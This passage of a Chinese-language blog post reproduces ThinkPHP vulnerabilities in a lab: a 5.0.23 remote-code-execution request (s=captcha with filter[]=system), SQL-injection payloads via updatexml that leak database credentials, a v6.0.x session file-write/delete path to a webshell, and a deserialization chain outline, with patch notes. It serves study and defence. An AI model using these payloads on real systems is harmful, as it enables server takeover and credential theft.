+<p>这导致 <code>system($_SERVER[&#39;REQUEST_METHOD&#39;])</code> 执行 <strong>反向 shell 命令</strong>。</p>
+</li>
+<li><p><strong>修复方案</strong> ThinkPHP官方在后续版本中修复了此漏洞，主要措施包括：</p>
+<p>对var_method参数进行白名单限制（仅允许GET&#x2F;POST&#x2F;PUT&#x2F;DELETE等合法方法）。</p>
+<p>强化filter属性的初始化逻辑，避免外部参数覆盖</p>
+</li>
+</ol>
+<h3 id="Ⅴ、漏洞影响"><a href="#Ⅴ、漏洞影响" class="headerlink" title="Ⅴ、漏洞影响"></a>Ⅴ、漏洞影响</h3><p>此漏洞允许攻击者通过HTTP请求直接执行任意系统命令，典型利用场景包括：</p>
+<ul>
+<li><p>信息泄露：执行id、whoami、ls等命令</p>
+</li>
+<li><p>写入Webshell：通过echo或文件操作函数写入恶意代码</p>
+</li>
+<li><p>反弹Shell：构造命令建立反向连接，获取服务器控制权。</p>
+</li>
+</ul>
+<p>通过上述机制，攻击者可在未授权情况下完全控制目标服务器，属于高危远程代码执行漏洞。</p>
+<p>在ThinkPHP 5.0.23远程代码执行漏洞中，“<strong>绕过路由检测</strong>”是攻击链的关键步骤，其核心逻辑是通过<code>s=captcha</code>触发框架的路由机制缺陷，从而绕过正常的路由安全检查并直接操作<code>Request</code>类的敏感方法。以下是具体技术细节分析：</p>
+<h3 id="Ⅵ、路由机制的正常流程"><a href="#Ⅵ、路由机制的正常流程" class="headerlink" title="Ⅵ、路由机制的正常流程"></a>Ⅵ、路由机制的正常流程</h3><p>ThinkPHP框架的路由机制通常遵循以下流程：</p>
+<ol>
+<li><p>URL解析：根据URL中的s参数确定模块、控制器和方法。例如：&#x2F;index.php?s&#x3D;index&#x2F;controller&#x2F;action</p>
+<p>会调用index模块下的controller控制器的action方法</p>
+</li>
+<li><p>路由分发：框架通过routeCheck()方法验证路由规则，并分发到对应的控制器方法执行</p>
+</li>
+<li><p>参数过滤：在正常流程中，控制器方法的参数会经过过滤（如白名单校验），以防止恶意输入。</p>
+</li>
+</ol>
+<h3 id="Ⅶ、漏洞中的“路由绕过”原理"><a href="#Ⅶ、漏洞中的“路由绕过”原理" class="headerlink" title="Ⅶ、漏洞中的“路由绕过”原理"></a>Ⅶ、漏洞中的“路由绕过”原理</h3><p>攻击者通过构造<code>s=captcha</code>触发漏洞的核心在于<strong>利用路由注册类型的缺陷</strong>，具体步骤如下：</p>
+<h4 id="1-s-captcha的路由注册类型"><a href="#1-s-captcha的路由注册类型" class="headerlink" title="1. s=captcha的路由注册类型"></a>1. <strong><code>s=captcha</code>的路由注册类型</strong></h4><ul>
+<li><p><code>captcha</code>模块的特殊性：captcha是ThinkPHP内置的验证码模块，其路由规则被注册为method类型，即通过HTTP请求方法（GET&#x2F;POST）来分发逻辑method类型路由的分支：当s&#x3D;captcha时，框架进入routeCheck()</p>
+<p>方法后，会根据method参数（如GET&#x2F;POST）选择对应的路由处理逻辑，而非直接调用控制器方法</p>
+</li>
+</ul>
+<h4 id="2-绕过路由检测的触发点"><a href="#2-绕过路由检测的触发点" class="headerlink" title="2. 绕过路由检测的触发点"></a>2. <strong>绕过路由检测的触发点</strong></h4><ul>
+<li><p><code>routeCheck()</code>方法的缺陷：在routeCheck()方法中，若路由规则为method类型，框架会跳过对控制器参数的严格校验，直接进入Request类的method方法处理</p>
+</li>
+<li><p>分发到<code>method</code>调度类型：攻击链通过s&#x3D;captcha将请求分发到method调度分支，从而绕过正常控制器方法的参数过滤逻辑</p>
+</li>
+</ul>
+<h3 id="Ⅷ、操作Request类敏感方法"><a href="#Ⅷ、操作Request类敏感方法" class="headerlink" title="Ⅷ、操作Request类敏感方法"></a>Ⅷ、操作<code>Request</code>类敏感方法</h3><p>绕过路由检测后，攻击者通过以下方式直接操作<code>Request</code>类：</p>
+<ol>
+<li><p><strong>覆盖<code>__construct</code>构造函数</strong>： 通过<code>_method=__construct</code>参数，调用<code>Request</code>类的构造函数，覆盖其属性（如<code>filter</code>和<code>server</code>），从而控制后续过滤逻辑 </p>
+<p>例如：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">HttpPOST /<span class="hljs-keyword">index</span>.php?s=captcha<br>_method=__construct&amp;<span class="hljs-keyword">filter</span>[]=<span class="hljs-keyword">system</span>&amp;<span class="hljs-keyword">server</span>[REQUEST_METHOD]=id<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>filter[]=system</code>：将全局过滤函数设置为<code>system</code>，后续参数处理时会调用此函数执行命令。</p>
+<p>server[REQUEST_METHOD]&#x3D;id：覆盖服务器变量，作为system函数的参数</p>
+</li>
+</ul>
+</li>
+<li><p><strong>触发命令执行</strong>： 通过<code>method=get</code>调用<code>Request::param()</code>方法，最终在<code>filterValue()</code>函数中执行<code>call_user_func(&#39;system&#39;, &#39;id&#39;)</code>，实现远程代码执行</p>
+</li>
+</ol>
+<h3 id="Ⅸ、漏洞影响与修复方案"><a href="#Ⅸ、漏洞影响与修复方案" class="headerlink" title="Ⅸ、漏洞影响与修复方案"></a>Ⅸ、漏洞影响与修复方案</h3><ol>
+<li><p><strong>漏洞影响</strong>： 攻击者通过<code>s=captcha</code>绕过路由检测，直接调用敏感方法，可执行任意系统命令、上传Webshell或反弹Shell </p>
+</li>
+<li><p><strong>修复方案</strong>：</p>
+<ul>
+<li><p>官方补丁：ThinkPHP在5.0.23及以上版本中修复了该漏洞，</p>
+</li>
+<li><p>核心措施包括：对路由参数s进行严格校验（如白名单限制）</p>
+<p>禁止通过_method参数覆盖Request类的敏感属性</p>
+</li>
+<li><p>临时缓解：若无法升级，可手动在App::module方法中增加过滤逻辑，限制filter参数的覆盖</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过<code>s=captcha</code>绕过路由检测的本质是<strong>利用框架对method类型路由的校验缺失</strong>，结合<code>Request</code>类的属性覆盖漏洞，形成完整的远程代码执行链。该漏洞的利用过程深刻反映了框架在路由分发和参数过滤机制上的设计缺陷</p>
+<table>
+<thead>
+<tr>
+<th><strong>特征</strong></th>
+<th><strong>5.0.22&#x2F;5.1.29版本</strong></th>
+<th><strong>5.0.23版本</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>漏洞触发点</strong></td>
+<td>路由解析缺陷（直接调用控制器方法）</td>
+<td>Request类属性覆盖（覆盖<code>filter</code>属性）</td>
+</tr>
+<tr>
+<td><strong>利用方式</strong></td>
+<td>通过URL参数直接构造路径</td>
+<td>需通过POST请求覆盖类属性</td>
+</tr>
+<tr>
+<td><strong>参数传递</strong></td>
+<td>直接通过<code>vars[]</code>传递命令参数</td>
+<td>依赖<code>server[REQUEST_METHOD]</code>传递参数</td>
+</tr>
+<tr>
+<td><strong>路由校验限制</strong></td>
+<td>无控制器名过滤</td>
+<td>新增正则校验阻止非法控制器调用</td>
+</tr>
+<tr>
+<td><strong>默认安全配置</strong></td>
+<td>未开启强制路由</td>
+<td>部分路由分支需依赖特定模块（如<code>captcha</code>）</td>
+</tr>
+</tbody></table>
+<h2 id="三、ThinkPHP5-SQL注入漏洞-敏感信息泄露"><a href="#三、ThinkPHP5-SQL注入漏洞-敏感信息泄露" class="headerlink" title="三、ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露"></a>三、ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</h2><h3 id="1-影响版本：-5-0-13"><a href="#1-影响版本：-5-0-13" class="headerlink" title="1. 影响版本：  5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15 、 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5"></a>1. 影响版本：  5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15 、 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5</h3><h3 id="2-漏洞介绍"><a href="#2-漏洞介绍" class="headerlink" title="2. 漏洞介绍"></a>2. 漏洞介绍</h3><p>ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5.0（&lt;5.1.23）中,<strong>开启debug模式</strong>，传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码</p>
+<h3 id="3-漏洞利用的前提条件"><a href="#3-漏洞利用的前提条件" class="headerlink" title="3. 漏洞利用的前提条件"></a>3. 漏洞利用的前提条件</h3><p>开启application&#x2F;config.php中的app_debug和app_trace</p>
+<p><code>app_trace</code>（<strong>默认关闭</strong>）作用：开启后，ThinkPHP 会在页面底部显示完整的调试信息（包括 SQL 语句）。</p>
+<p><code>app_debug</code>（<strong>默认开启</strong>）作用：控制是否在前端显示详细错误信息。</p>
+<h3 id="4-漏洞利用过程"><a href="#4-漏洞利用过程" class="headerlink" title="4. 漏洞利用过程"></a>4. 漏洞利用过程</h3><p>docker启靶场然后浏览器访问：<code>http://your-ip/index.php?ids[]=1&amp;ids[]=2</code>[<strong><code>ids</code> 这个参数通常用于查询数据库</strong> <code>id</code> 或 <code>ids</code> 是<strong>常见的查询参数</strong>，通常用于获取数据库中的记录]</p>
+<p><strong>payload1</strong>:<code>http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code></p>
+<p><strong>payload2</strong>:<code>http://127.0.0.1/v5.0.15/public/index.php/?username=) union select updatexml(1,concat(0x7,database(),0x7e),1)#</code></p>
+<p><strong>payload1原理</strong>：</p>
+<p><strong>作用</strong>利用 ThinkPHP 处理数组参数的机制，造成 SQL 注入，并利用 <code>updatexml()</code> 读取 MySQL 用户信息。</p>
+<p>分解</p>
+<ol>
+<li><p><code>ids[0,updatexml(0,concat(0xa,user()),0)]=1</code></p>
+<ul>
+<li>这里的 <code>ids</code> 是一个<strong>数组参数</strong>，而 <code>ThinkPHP 5.0.15</code> 解析 <code>$_GET[&#39;ids&#39;]</code> 时，<strong>没有严格校验数组键的合法性</strong>。</li>
+<li><code>updatexml(0,concat(0xa,user()),0)</code> 被当作数组的<strong>键值</strong>，而 <code>1</code> 作为数组的值。</li>
+</ul>
+</li>
+<li><p>服务器端的 SQL 可能类似：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ids&#x27;</span>]; <span class="hljs-comment">// 这里是数组</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id IN (&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$ids</span>)) . <span class="hljs-string">&quot;)&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>由于 <strong><code>implode()</code> 拼接数组键值</strong>，SQL 变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">0</span>, updatexml(<span class="hljs-number">0</span>,concat(<span class="hljs-number">0xa</span>,<span class="hljs-keyword">user</span>()),<span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>
+
+<p><strong>SQL 被注入执行</strong>，并通过 <code>updatexml()</code> 触发错误信息，<strong>返回 MySQL 用户名</strong>。</p>
+</li>
+</ol>
+<p>为什么能成功？</p>
+<ol>
+<li><strong>ThinkPHP 5.0.15 允许数组参数 <code>ids[]</code> 直接拼接到 SQL 语句</strong>：<ul>
+<li>解析 <code>$_GET[&#39;ids&#39;]</code> 时，没有对键值进行严格过滤，导致 <code>updatexml()</code> 被直接插入到 SQL 查询。</li>
+</ul>
+</li>
+<li><strong><code>updatexml()</code> 触发错误信息，泄露数据库用户名</strong>：<ul>
+<li>通过 <code>concat(0xa,user())</code>，可获取数据库的 <code>user()</code> 信息</li>
+</ul>
+</li>
+</ol>
+<p><strong>payload2原理：</strong></p>
+<p>这就是直接通过闭合来实现的sql注入</p>
+<p>从下图中可以看出已经注入成功回显信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271714284.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-03-27 171000"></p>
+<p>继续往下翻可以查看到数据库的账号以及密码（信息泄露）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271715164.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-03-27 171011"></p>
+<h2 id="四、ThinkPHP-v6-0-x-任意文件操作漏洞"><a href="#四、ThinkPHP-v6-0-x-任意文件操作漏洞" class="headerlink" title="四、ThinkPHP v6.0.x 任意文件操作漏洞"></a>四、ThinkPHP v6.0.x 任意文件操作漏洞</h2><p>漏洞描述：在开启Session的情况下可以导致创建任意文件以及删除任意文件，<strong>特定情况下</strong>可以getshell[<strong>清楚后端处理session的逻辑</strong>]</p>
+<h3 id="影响版本：6-0-0"><a href="#影响版本：6-0-0" class="headerlink" title="影响版本：6.0.0&lt;&#x3D;thinphp&lt;&#x3D;6.0.2"></a>影响版本：6.0.0&lt;&#x3D;thinphp&lt;&#x3D;6.0.2</h3><h3 id="实现前提"><a href="#实现前提" class="headerlink" title="实现前提"></a>实现前提</h3><p>开启Session</p>
+<p>清楚后端处理session的逻辑</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h3><p>根据文件目录和更改的函数部分猜测：可能是存储 Session 时导致的文件写入；然后跟进找一下相关的函数，可以看到 <code>vendor/topthink/framework/src/think/session/Store.php:254</code> 的 save()函数，265 行还可以对文件进行删除操作，并且对后端业务逻辑依赖较低</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926810.webp" srcset="/img/loading.gif" lazyload alt="save.png"></p>
+<p>可以看到设置了 $sessionId，并且调用了一个 write 函数，继续跟进，找到 write()函数 <code>vendor/topthink/framework/src/think/session/driver/File.php:210</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926812.webp" srcset="/img/loading.gif" lazyload alt="write.png"></p>
+<p>继续跟进，找到 writeFile()函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926795.webp" srcset="/img/loading.gif" lazyload alt="writeFile.png"></p>
+<p>可以看到调用了 <code>file_put_contents()</code> 函数，这里是真正<strong>写入文件的操作</strong>了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931801.webp" srcset="/img/loading.gif" lazyload alt="fileputcontents.png"></p>
+<ul>
+<li>接下来我们反向分析一下，看看能不能找到可控点</li>
+</ul>
+<ol>
+<li>函数 <code>file_put_contents($path,$content,LOCK_EX)</code> 中参数 <code>$path,$content</code> 来源于函数 <code>writeFile($path,$data)</code></li>
+<li>函数 <code>writeFile($path,$data)</code> 中参数 <code>$path,$data</code> 来源于函数 <code>write(String $sessionID,String $sessiData)</code></li>
+<li>函数 <code>write(String $sessionID,String $sessiData)</code> 中参数 <code>$sessionID,$sessiData</code> 来源于 <code>save()</code> 中调用了 <code>write()</code>，同时传入的参数 <strong><code>$sessionId</code> 的值是调用 <code>getId()</code> 传入的</strong></li>
+</ol>
+<h4 id="getshell文件名写入点："><a href="#getshell文件名写入点：" class="headerlink" title="getshell文件名写入点："></a>getshell文件名写入点：</h4><p>综上：文件名来源于 最开始的<code>getId()</code>得到的<code>$sessionId</code>的值</p>
+<p>当传入的参数<code>$id</code>满足32位的长度时，就将该值设为<code>$this-&gt;id</code><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931581.webp" srcset="/img/loading.gif" lazyload alt="session.png"></p>
+<p>接下来找调用 <code>setId()</code> 的地方 <code>vendor/topthink/framework/src/think/middleware/SessionInit.php:46</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931098.webp" srcset="/img/loading.gif" lazyload alt="sessionI.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931398.png" srcset="/img/loading.gif" lazyload alt="image-20250327193115350"></p>
+<p>其中 <code>cookieName</code> 的值为 <code>PHPSESSID</code>，而 <code>$sessionId</code> 是 <code>cookie</code> 中名为 <code>PHPSESSID</code> 的值，因此是攻击者可控的，从而导致写入的文件名可控。</p>
+<h4 id="getshell文件内容写入点"><a href="#getshell文件内容写入点" class="headerlink" title="getshell文件内容写入点"></a>getshell文件内容写入点</h4><p>然后写入的文件名可控，那么写入<strong>的内容是否可控</strong>呢？</p>
+<p>分析发现，写入的内容就是创建session使用的内容。但是session的创建是由实际的后端业务逻辑来决定的，<strong>而默认环境下并没有创建session。因此，默认环境下无法做到任意文件写入。</strong></p>
+<p>因为这里是在本地环境中复现所以我们可以开启session然后加上后端获取session的业务逻辑便可完成复现</p>
+<p> thinkphp6 <strong>开启 session 的方法</strong>：删除 <code>/app/middleware.php</code> 最后一行的注释</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926314.webp" srcset="/img/loading.gif" lazyload alt="kq.png"></p>
+<p>我们在 <code>app\controller\index.php</code> 中增加一些代码后，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>namespaceapp\controller;<br>usethink\facade\Session;<br>useapp\BaseController;<br>classIndexextendsBaseController <br>&#123;<br><span class="hljs-title function_ invoke__">publicfunctionindex</span>()<br>&#123;<br><span class="hljs-title class_">Session</span>::<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;thinkphp&#x27;</span>);<br>return1;<br><span class="hljs-comment">// return&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V6&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;13载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;;</span><br>&#125;<br><span class="hljs-title function_ invoke__">publicfunctionhello</span>(<span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;ThinkPHP6&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">return</span><span class="hljs-string">&#x27;hello,&#x27;</span>.<span class="hljs-variable">$name</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="本地环境复现"><a href="#本地环境复现" class="headerlink" title="本地环境复现"></a>本地环境复现</h3><p>很简单，只需要构造 PHPSESSID 的值即可，值为 <code>string</code>&amp;&amp;长度为 32</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926327.webp" srcset="/img/loading.gif" lazyload alt="tp.png"></p>
+<p>此时查看一下生成的 session，生成的 session 文件保存在 <code>\runtime\session</code> 下</p>
+<p>session 里的内容:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;name&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;thinkphp&quot;</span>;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到 session 的内容经过了序列化操作，只要将 session 的内容反序列化即可 getshell</p>
+<ul>
+<li>如果要 getshell 的话，后端需要有类似的 <code>Session::Set(&#39;name&#39;,$_POST[&#39;i&#39;])</code> 代码才可以利用</li>
+</ul>
+<p>**[session的存储是以序列化字符串的形式进行的但是一旦要用到就会进行反序列化 所以我们所写入的序列化字符串会被反序列化后写入到我们的shell文件中]**。</p>
+<p>这个漏洞其实很简单，就是用户可控变量导致的，也没有对一些数据的过滤等等。需要一定条件才可以利用，也就是开启 session；写 webshell 还要看具体的后端业务逻辑等等。</p>
+<h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272104553.png" srcset="/img/loading.gif" lazyload alt="image-20250327210419467"></p>
+<p>通过上图可知也可实现文件删除操作</p>
+<h2 id="五、ThinkPHP-v6-0-x-反序列化漏洞"><a href="#五、ThinkPHP-v6-0-x-反序列化漏洞" class="headerlink" title="五、ThinkPHP v6.0.x 反序列化漏洞"></a>五、ThinkPHP v6.0.x 反序列化漏洞</h2><h3 id="影响版本：thinkPHP-v6-0-0-6-0-3"><a href="#影响版本：thinkPHP-v6-0-0-6-0-3" class="headerlink" title="影响版本：thinkPHP v6.0.0-6.0.3"></a>影响版本：thinkPHP v6.0.0-6.0.3</h3><p>环境：使用上一个漏洞的环境</p>
+<p>版本安装后默认使用单应用模式部署，url访问受到路由模式的影响，为了使用方便，我们先要去&#x2F;config&#x2F;app.php 中将with_route &#x3D;&gt; false</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272110296.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>需要在根目录下的 &#x2F;app&#x2F;controller的index.php里面存在unserialize()函数且为可控点，例如存在</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">l_Ry</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272110975.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>POST传参数a</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/v6.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>/public/index.php/<span class="hljs-keyword">index</span>/l_Ry<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272113090.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>至此环境就搭建完成了</p>
+<p>我跟着网上的资料大概分析了一下<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/123102811">https://blog.csdn.net/cosmoslin/article/details/123102811</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9546#toc-16">https://xz.aliyun.com/t/9546#toc-16</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/123237118">https://blog.csdn.net/weixin_45794666/article/details/123237118</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9405#toc-3">https://xz.aliyun.com/t/9405#toc-3</a></p>
+<p>漏洞的一般起点在<code>__destruct()</code>函数，可利用的函数在<code>vendor\topthink\think-orm\src\Model.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272109841.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>中间的过程太繁杂，大体和参考的文章差不多就不写出来了，顺着往下找，最终利用点为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$value</span> = <span class="hljs-variable">$closure</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable language_">$this</span>-&gt;data);<br></code></pre></td></tr></table></figure>
+
+<p>完整的POP利用链为__destruct()——&gt;save()——&gt;updateData()——&gt;checkAllowFields()——&gt;db()——&gt;$this-&gt;table . $this-&gt;suffix（字符串拼接）——&gt;toString()——&gt;toJson()–&gt;toArray()——&gt;getAttr()——&gt;getData()——&gt;getRealFieldName()——&gt;getValue()</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CVE%E5%A4%8D%E7%8E%B0/" class="print-no-link">#CVE复现</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ThinkPHP典型漏洞复现</div>
+      <div>http://example.com/2025/03/27/ThinkPHP典型漏洞复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/25/CVE-2019-0211%20Apache%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="CVE-2019-0211 Apache提权漏洞复现">
+                        <span class="hidden-mobile">CVE-2019-0211 Apache提权漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"skSyD5RSTq4kiWeAhMeeY9ib-gzGzoHsz","appKey":"rQPg4V1fSy3hOP8QAyeJnyh8","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
